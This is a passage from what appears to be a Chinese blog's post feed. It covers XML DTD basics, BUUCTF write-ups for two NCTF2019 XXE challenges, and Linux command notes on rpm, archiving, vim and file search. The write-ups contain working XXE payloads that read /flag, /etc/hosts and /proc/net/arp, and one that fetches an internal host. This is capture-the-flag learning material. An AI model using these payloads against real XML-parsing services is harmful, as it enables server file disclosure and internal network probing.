class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>i<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>am<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>ppp<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ya!!!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当使用外部DTD时，通过如下语法引入。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">element-name</span> <span class="meta-keyword">category</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">element-name</span> (<span class="meta-keyword">element-content</span>)&gt;</span></span><br></pre></td></tr></table></figure><p>外部DTD实例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root-element</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;test.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>i<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>am<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>ppp<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ya!!!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd：</p><p>只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br></pre></td></tr></table></figure><p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><p>通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">element-name</span> <span class="meta-keyword">ANY</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>元素</th><th>&lt;!ENTITY 元素名称 类别&gt;</th><th>&lt;!ELEMENT 元素名称(元素内容)&gt;</th></tr></thead><tbody><tr><td>空元素</td><td>&lt;!ENTITY 元素名称 EMPTY&gt;</td><td>&lt;!ELEMENT &lt;br&gt; EMPTY&gt;&lt;/br&gt;</td></tr><tr><td>只有PCDATA的元素</td><td>&lt;!ENTITY 元素名称 #(PCDATA)&gt;</td><td>&lt;!ELEMENT from (#PCDATA)&gt;</td></tr><tr><td>任何内容的元素</td><td>&lt;!ENTITY 元素名称 ANY&gt;</td><td>&lt;!ELEMENT note ANY&gt;</td></tr><tr><td>子元素的元素</td><td>&lt;!ENTITY 元素名称 (子元素名称1,子元素名称2,……)&gt;</td><td>&lt;!ELEMENT note(to,from,heading,body)&gt;</td></tr></tbody></table><p>不过，被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用<code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code>实体来分别替换</p><p>- CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h2 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a>DTD属性</h2><p>属性声明使用以下语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure><p>DTD实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment identity CDATA &quot;A&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payment identity=&quot;A&quot; /&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD-实体"></a>DTD-实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可以在内部或外部进行声明</p><h3 id="一个内部实体声明"><a href="#一个内部实体声明" class="headerlink" title="一个内部实体声明"></a>一个内部实体声明</h3><p><strong>语法</strong></p><p>&lt;!ENTITY entity-name “entity-value”&gt;</p><p><strong>实例</strong></p><p>DTD 实例:</p><p>&lt;!ENTITY writer “Donald Duck.”&gt;<br>&lt;!ENTITY copyright “Copyright runoob.com”&gt;</p><p>XML 实例：</p><p>&lt;author&gt;&writer;&amp;copyright;&lt;/author&gt;</p><p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p><hr><h3 id="一个外部实体声明"><a href="#一个外部实体声明" class="headerlink" title="一个外部实体声明"></a>一个外部实体声明</h3><p><strong>语法</strong></p><p>&lt;!ENTITY entity-name SYSTEM “URI/URL”&gt;</p><p><strong>实例</strong></p><p>DTD 实例:</p><p>&lt;!ENTITY writer SYSTEM “<a href="http://www.runoob.com/entities.dtd&quot;&gt;">http://www.runoob.com/entities.dtd&quot;&gt;</a><br>&lt;!ENTITY copyright SYSTEM “<a href="http://www.runoob.com/entities.dtd&quot;&gt;">http://www.runoob.com/entities.dtd&quot;&gt;</a></p><p>XML example:</p><p>&lt;author&gt;&writer;&amp;copyright;&lt;/author&gt;</p><p>下面给两道xxe的题</p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>xxe直接构造查看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>通过标题可知为xxe漏洞</p><p>post报文直接构造xml</p><p>通过读取<code>/etc/hosts</code>和<code>/proc/net/arp</code> 得到C段的ip。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hosts&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>得到</code></p><p>127.0.0.1    localhost<br>::1    localhost ip6-localhost ip6-loopback<br>fe00::0    ip6-localnet<br>ff00::0    ip6-mcastprefix<br>ff02::1    ip6-allnodes<br>ff02::2    ip6-allrouters</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/net/arp&quot;</span> &gt;</span>]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到</p><p>IP address       HW type     Flags       HW address            Mask     Device<br>10.0.145.2       0x1         0x2         02:42:0a:00:91:02           *           eth0</p><p>访问10.0.145.2直接报错，但没关系，我们可以进行<strong>C段扫描</strong>(暴力破解)</p><p>10.0.145.11</p><p>得出flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://10.0.145.11&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>213<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rpm命令管理</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/rpm%E5%8C%85/rpm%E7%AE%A1%E7%90%86/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/rpm%E5%8C%85/rpm%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="rpm命令管理"><a href="#rpm命令管理" class="headerlink" title="rpm命令管理"></a>rpm命令管理</h1><p>树形依赖<br>环形依赖<br>模块依赖:<br><a href="http://www.rpmfind.net/linux/RPM/">www.rpmfind.net </a> </p><h1 id="yun在线依赖"><a href="#yun在线依赖" class="headerlink" title="yun在线依赖"></a>yun在线依赖</h1><h1 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h1><p>rpm -ivh 包全名<br>选项：<br>    -i(install)<br>    -v(verbose)<br>    -h(hash)<br>    –nodeps<br>rmp -Uvh 包全名 更新<br>rmp -e 包名 卸载   </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>压缩解压命令</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h1><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p>命令英文原意:GNUzip<br>命令所在路径:/bin/gzip<br>执行权限:所有用户<br>语法: gzip[文件]<br>功能描述:压缩文件压缩后<br>文件格式:.gZ  </p><h2 id="gunzip"><a href="#gunzip" class="headerlink" title="gunzip"></a>gunzip</h2><p>命令英文原意:GNUunzip<br>命令所在路径:/bin/gunzip<br>执行权限:所有用户<br>语法: gunzip[压缩文件]<br>功能描述:解压缩.gz的压缩文件  </p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>命令所在路径:/bin/tar<br>执行权限:所有用户<br>语法: tar选项[-zcf][压缩后文件名][目录]<br>-c 打包<br>-v 显示详细信息<br>-f 指定文件名<br>-z 打包同时压缩<br>功能描述:打包目录<br>eg: tar <strong>-zcf</strong> ec.tar.gz ec<br>打包ec 并压缩成ec文件<br>tar -zxf etc.tar.gz //解压</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>命令所在路径:/usr/bin/zip<br>执行权限:所有用户<br>语法:zip 选项[-r][压缩后文件名][文件或目录]<br>-r 压缩目录<br>功能描述:压缩文件或目录<br>压缩后文件格式:.zip<br>能保留源文件</p><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>解压缩</p><h2 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h2><p>命令所在路径:/usr/bin/bzip2<br>执行权限:所有用户<br>语法: bzip2选项[-k][文件]<br><strong>-k产生压缩文件后保留原文件</strong><br>功能描述:压缩文件<br>压缩后文件格式:.bz2<br>bzip2 -k et<br>tar -cjf et.tar.bz2 et  //压缩<br>tar -xjf et.tar.bz2 //解压缩</p><h2 id="bunzip2"><a href="#bunzip2" class="headerlink" title="bunzip2"></a>bunzip2</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table><thead><tr><th>格式</th><th>.gz</th><th>.tar</th><th>.tar.gz</th><th>.zip</th><th>.bz2</th><th>.tar.bz2</th></tr></thead><tbody><tr><td>压缩</td><td>gzip</td><td>tar -cf</td><td>tar -zcf</td><td>zip -r</td><td>bzip2</td><td>tar -cjf</td></tr><tr><td>解压</td><td>gunzip(gzip -d)</td><td>-xf</td><td>-zxf</td><td>unzip</td><td>bunzip2</td><td>-xjf</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>帮助命令</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h1><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>命令英文原意: manual<br>命令所在路径:/usr/bin/man<br>执行权限:所有用户<br>语法: man[命令或配置文件]<br>功能描述:获得帮助信息范例:$ man ls<br>查看ls命令的帮助信息$ man services<br>查看配置文件services的帮助信息<br>当查看配置文件时不需要文件的绝对路径，只需添加文件的名称<br>1表示对命令的帮助 5表示对配置文件的帮助<br>man 5 passwd  </p><h2 id="whatis-amp-apropos"><a href="#whatis-amp-apropos" class="headerlink" title="whatis &amp; apropos"></a>whatis &amp; apropos</h2><p>whatis和apropos都可以查命令和配置文件。 </p><h2 id="–help"><a href="#–help" class="headerlink" title="–help"></a>–help</h2><p>eg: ls –help</p><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>命令所在路径:Shell<br>内置命令执行权限:所有用户<br>语法: help命令<br>功能描述:获得Shell内置命令的帮助信息<br>eg:$ help umask<br>查看umask命令的帮助信息<br><img src="/.io//img/linux.jpeg" alt="linux"></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim基础</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="vim基础"><a href="#vim基础" class="headerlink" title="vim基础"></a>vim基础</h1><p>set nu 设置行号  </p><h2 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>a</td><td>在光标所在字符后插入</td></tr><tr><td>A</td><td>在光标所在行尾插入</td></tr><tr><td>i</td><td>在光标所在字符前插入</td></tr><tr><td>I</td><td>在光标所在行首插</td></tr><tr><td>o</td><td>在光标下插入新行</td></tr><tr><td>O</td><td>在光标上插入新行</td></tr></tbody></table><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>: set nu</td><td>设置行号</td></tr><tr><td>$</td><td>移至行尾</td></tr><tr><td>: set nonu</td><td>取消行号</td></tr><tr><td>0</td><td>移至行首</td></tr><tr><td>gg</td><td>到第一行</td></tr><tr><td>G</td><td>到最后一行</td></tr><tr><td>nG</td><td>到第n行</td></tr><tr><td>: n</td><td>到第n行</td></tr></tbody></table><h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>x</td><td>删除光标所在处字符</td></tr><tr><td>nx</td><td>删除光标所在处后n个字符</td></tr><tr><td>dd</td><td>删除光标所在行，ndd删除n行</td></tr><tr><td>dG</td><td>删除光标所在行到文件末尾内容</td></tr><tr><td>D</td><td>删除光标所在处到行尾内容</td></tr><tr><td>:nl.n2d</td><td>删除指定范围的行</td></tr></tbody></table><h2 id="复制和剪切"><a href="#复制和剪切" class="headerlink" title="复制和剪切"></a>复制和剪切</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>yy</td><td>复制当前行</td></tr><tr><td>nyy</td><td>复制当前行以下n行</td></tr><tr><td>dd</td><td>剪切当前行</td></tr><tr><td>ndd</td><td>剪切当前行以下n行</td></tr><tr><td>p、P</td><td>粘贴在当前光标所在行下或行上</td></tr></tbody></table><h2 id="替换和取消"><a href="#替换和取消" class="headerlink" title="替换和取消"></a>替换和取消</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>r</td><td>取代光标所在处字符</td></tr><tr><td>R</td><td>从光标所在处开始替换字符，按Esc结束</td></tr><tr><td>u</td><td>取消上一步操作</td></tr></tbody></table><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>string</td><td>搜索指定字符串，搜索时忽略大小写:set ic</td></tr><tr><td>n</td><td>搜索指定字符串的下一个出现位置</td></tr><tr><td>:%s/old/new/g</td><td>全文替换指定字符串 g是不询问 c询问确认</td></tr><tr><td>:nl n2s old/new/g</td><td>在一定范围内替换指定字符串</td></tr></tbody></table><h2 id="保存和退出"><a href="#保存和退出" class="headerlink" title="保存和退出"></a>保存和退出</h2><p>命令|作用<br>:w|保存修改<br>:w new filename|另存为指定文件<br>:wq|保存修改并退出<br>ZZ|快捷键，保存修改并退出<br>:q!|不保存修改退出<br>:wq!|保存修改并退出(文件所有者及root可使用)</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><dl><dt>导入命令执行结果:r !命令<br>定义快捷键:map快捷键触发命令<br>范例:  : map  ^P I#&lt;ESC&gt;</dt><dd>map B Ox<br>连续行注释<br>:nl.n2s/^/#/g<br>:n1.n2s/^#/lg 删除开头的#<br>:n1 .n2s/^////g 插入//<br>替换 :ab aname bname 会将a替换成b</dd></dl><p>将常用的快捷键放在.vimrc下</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件搜索命令</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="文件搜索-find"><a href="#文件搜索-find" class="headerlink" title="文件搜索 find"></a>文件搜索 find</h1><p>命令名称: find<br>命令所在路径:/bin/find<br>执行权限:所有用户<br>语法: find[搜索范围][匹配条件]<br>功能描述:文件搜索  </p><p>eg：<br>$find /etc -name init<br>在/etc下查找文件init<br>$find /etc -name *init*<br>?单字符匹配<br>文件中包含init<br>-iname 不区分大小写  </p><p>$find / -size +204800<br>1数据块 512字节 0.5K<br>在根目录下查找大于100MB文件<br>+n 大于 -n 小于 n 等于   </p><p>$find /home -user username<br>-group 是根据在所属组里查找  </p><p>find /etc -cmin -5 (超过5分钟加五)<br>在/etc 下查找5分钟内被修改过的属性文件和目录<br>-amin 访问时间access<br>-cmin 文件属性change ls找到的<br>-mmin 文件内容modify  </p><p>-a表示两个条件都满足<br>-o表示两个条件一个满足即可  </p><p>-type 根据文件类型查找<br>f 文件 d 目录 l 软连接 </p><p>$find /etc -name init -exec ls -l {} ;<br>在/etc下查找init文件并显示其详细信息-exec/-ok 命令 {} ; </p><p>eg：find /etc -name init* -a -type f -exec ls -lh {} ;<br>查找etc目录下的init名字开头的文件并显示详细信息  </p><p>-inum 根据i结点查找<br>ls -i<br>查看i结点<br>eg：find -inum id -exec rm {} ;</p><h1 id="其他文件搜索"><a href="#其他文件搜索" class="headerlink" title="其他文件搜索"></a>其他文件搜索</h1><h2 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h2><p>命令所在路径:/usr/bin/<br>locate执行权限:所有用户<br>语法: locate文件名<br>功能描述:在文件资料库中查找文件<br>-i 不区分大小写</p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>updatedb 更新资料库<br>tmp目录下的文件找不到，因为不在范围内</p><h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><p>命令所在路径:/usr/bin/which<br>执行权限:所有用户<br>语法: which命令<br>功能描述:搜索命令所在目录及别名信息<br>which ls  </p><h2 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h2><p>命令所在路径:/usr/bin/whereis<br>执行权限:所有用户<br>语法: whereis[命令名称]<br>功能描述:搜索命令所在目录及帮助文档路径  </p><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>命令所在路径:/bin/grep<br>执行权限:所有用户<br>语法: grep -iv[指定字串][文件]<br>功能描述:在文件中搜寻字串匹配的行并输出<br>-i不区分大小写<br>-v排除指定字串  </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关机与重启</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%85%B3%E6%9C%BA%E5%92%8C%E9%87%8D%E5%90%AF/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%85%B3%E6%9C%BA%E5%92%8C%E9%87%8D%E5%90%AF/</url>
      
